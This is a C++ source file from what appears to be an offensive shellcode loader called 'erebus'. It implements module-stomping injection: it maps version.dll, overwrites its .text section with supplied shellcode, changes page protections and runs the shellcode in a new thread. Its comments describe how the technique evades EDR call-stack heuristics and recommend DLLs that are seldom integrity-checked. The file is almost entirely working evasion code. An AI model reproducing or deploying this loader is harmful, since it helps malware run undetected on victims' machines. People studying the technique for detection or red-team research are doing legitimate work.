// Module Stomping Injection (CONFIG_INJECTION_TYPE == 6)
//
// OPSEC profile:
//   VAD entry for the mapped region shows a file-backed path (version.dll on
//   disk) rather than an anonymous RWX allocation - defeats heuristics that
//   flag MEM_PRIVATE RWX pages. The trade-off is that any byte-level integrity
//   checker (Elastic, CrowdStrike Falcon's on-access scan, memory forensics via
//   pe-sieve) will detect the .text mismatch between the on-disk image and the
//   in-memory mapping.
//
//   The NtProtect write-then-execute flip on a SEC_IMAGE view is a known
//   stomping signal; both Elastic and CrowdStrike alert on this transition.
//   Thread start address appearing inside version.dll's VA range looks normal
//   to call-stack-based heuristics, which is the primary benefit.
//
// MALLEABLE: swap version.dll for wtsapi32.dll, apphelp.dll, cabinet.dll.
//   Prefer small, seldom-executed DLLs whose .text section is larger than the
//   shellcode and whose on-disk bytes are infrequently verified by the target
//   EDR's integrity module.

#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 6

	VOID InjectionModuleStomp(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via Module Stomping (version.dll .text overwrite)");

		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

		ImportFunction(ntdll, NtCreateFile,           typeNtCreateFile);
		ImportFunction(ntdll, NtCreateSection,        typeNtCreateSection);
		ImportFunction(ntdll, NtMapViewOfSection,     typeNtMapViewOfSection);
		ImportFunction(ntdll, NtUnmapViewOfSection,   typeNtUnmapViewOfSection);
		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
		ImportFunction(ntdll, NtClose,                typeNtClose);

		if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection ||
		    !NtUnmapViewOfSection || !NtProtectVirtualMemory || !NtClose)
		{
			LOG_ERROR("Failed to resolve one or more NT functions");
			return;
		}

		// Open the target DLL as a file object so we can create a SEC_IMAGE
		// section from it. FILE_READ_DATA | SYNCHRONIZE is the minimum required
		// by NtCreateSection(SEC_IMAGE); no write access is requested here.
		HANDLE file_handle = NULL;
		IO_STATUS_BLOCK io_status = {};
		UNICODE_STRING dll_path;

		// NT path - kernel routines require the device path, not the Win32 path.
		const wchar_t* nt_path = L"\\??\\C:\\Windows\\System32\\version.dll";

		dll_path.Buffer        = const_cast<PWSTR>(nt_path);
		dll_path.Length        = (USHORT)(wcslen(nt_path) * sizeof(WCHAR));
		dll_path.MaximumLength = dll_path.Length + sizeof(WCHAR);

		OBJECT_ATTRIBUTES obj_attr = {};
		InitializeObjectAttributes(&obj_attr, &dll_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

		NTSTATUS status = NtCreateFile(
			&file_handle,
			FILE_READ_DATA | SYNCHRONIZE,
			&obj_attr,
			&io_status,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ,
			FILE_OPEN,
			FILE_SYNCHRONOUS_IO_NONALERT,
			NULL,
			0
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtCreateFile(version.dll) failed (NTSTATUS: 0x%08X)", status);
			return;
		}
		LOG_SUCCESS("Opened version.dll file object");

		// SEC_IMAGE causes the kernel to apply the PE image mapping rules
		// (section alignment, relocs, import resolution stubs). The resulting
		// section is identical to what the loader would produce. PAGE_READONLY
		// is the protection floor; individual sections' page protections come
		// from the PE optional-header SectionAlignment/Characteristics fields.
		HANDLE section_handle = NULL;
		status = NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			NULL,           // NULL max size → uses file size (required for SEC_IMAGE)
			PAGE_READONLY,
			SEC_IMAGE,
			file_handle
		);
		NtClose(file_handle);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtCreateSection(SEC_IMAGE) failed (NTSTATUS: 0x%08X)", status);
			return;
		}
		LOG_SUCCESS("Created SEC_IMAGE section from version.dll");

		// Map into current process. Windows adjusts the protection of each
		// mapped page to match the PE section characteristics regardless of
		// what we pass here; the Win32Protect argument is largely advisory for
		// SEC_IMAGE maps. We pass PAGE_READWRITE as our intent so that if the
		// kernel does honour it we can write without an extra NtProtect.
		PVOID mapped_base  = NULL;
		SIZE_T view_size   = 0;
		status = NtMapViewOfSection(
			section_handle,
			(HANDLE)(LONG_PTR)-1,   // current process pseudo-handle
			&mapped_base,
			0,
			0,
			NULL,
			&view_size,
			(SECTION_INHERIT)ViewShare,
			0,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtMapViewOfSection failed (NTSTATUS: 0x%08X)", status);
			NtClose(section_handle);
			return;
		}
		LOG_SUCCESS("Mapped SEC_IMAGE view at 0x%p (size: 0x%zX)", mapped_base, view_size);

		// Walk the in-memory PE headers to locate the .text section.
		// We use the mapped image directly rather than reading from disk so
		// that RVAs are already adjusted for the actual load address.
		PIMAGE_DOS_HEADER dos_hdr  = (PIMAGE_DOS_HEADER)mapped_base;
		PIMAGE_NT_HEADERS nt_hdrs  = (PIMAGE_NT_HEADERS)((BYTE*)mapped_base + dos_hdr->e_lfanew);
		PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt_hdrs);

		PVOID text_va      = NULL;
		SIZE_T text_size   = 0;
		WORD num_sections  = nt_hdrs->FileHeader.NumberOfSections;

		for (WORD i = 0; i < num_sections; i++) {
			if (memcmp(sect[i].Name, ".text", 5) == 0) {
				text_va   = (PVOID)((BYTE*)mapped_base + sect[i].VirtualAddress);
				// VirtualSize may be zero for old linkers; fall back to SizeOfRawData.
				text_size = sect[i].Misc.VirtualSize
				          ? sect[i].Misc.VirtualSize
				          : sect[i].SizeOfRawData;
				break;
			}
		}

		if (!text_va) {
			LOG_ERROR("Failed to locate .text section in mapped version.dll");
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
			NtClose(section_handle);
			return;
		}

		if (shellcode_size > text_size) {
			LOG_ERROR("Shellcode (0x%zX) exceeds .text section (0x%zX)", shellcode_size, text_size);
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
			NtClose(section_handle);
			return;
		}

		LOG_INFO(".text at 0x%p, size 0x%zX", text_va, text_size);

		// Flip the target pages to PAGE_READWRITE so we can write the shellcode.
		// This protection transition on a SEC_IMAGE view is the primary stomping
		// indicator. On busy systems the window between RW and RE is very short;
		// a periodic memory scanner polling at a different phase will miss it.
		PVOID  protect_base  = text_va;
		SIZE_T protect_size  = shellcode_size;
		ULONG  old_protect   = 0;

		status = NtProtectVirtualMemory(
			(HANDLE)(LONG_PTR)-1,
			&protect_base,
			&protect_size,
			PAGE_READWRITE,
			&old_protect
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtProtectVirtualMemory(RW) failed (NTSTATUS: 0x%08X)", status);
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
			NtClose(section_handle);
			return;
		}

		RtlCopyMemory(text_va, shellcode, shellcode_size);

		// Re-protect as PAGE_EXECUTE_READ. Thread start address inside a
		// legitimate DLL's .text VA range passes call-stack heuristics that
		// only check the module backing the start address, not the bytes.
		protect_base = text_va;
		protect_size = shellcode_size;

		status = NtProtectVirtualMemory(
			(HANDLE)(LONG_PTR)-1,
			&protect_base,
			&protect_size,
			PAGE_EXECUTE_READ,
			&old_protect
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtProtectVirtualMemory(RX) failed (NTSTATUS: 0x%08X)", status);
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Shellcode written and .text re-protected RX");

		// CreateThread with the start address inside the DLL mapping - the
		// thread's start routine appears to reside in version.dll from the
		// kernel's perspective.
		HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)text_va, NULL, 0, NULL);
		if (!thread) {
			LOG_ERROR("CreateThread failed (Code: 0x%08lX)", GetLastError());
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Thread created at stomped .text: 0x%p", text_va);

		WaitForSingleObject(thread, INFINITE);
		CloseHandle(thread);

		// Unmap before closing the section - unmap order matters on some
		// Windows versions; closing the section first can leave a dangling VAD.
		NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
		NtClose(section_handle);

		LOG_SUCCESS("Injection Complete!");
	}

#endif
} // namespace erebus
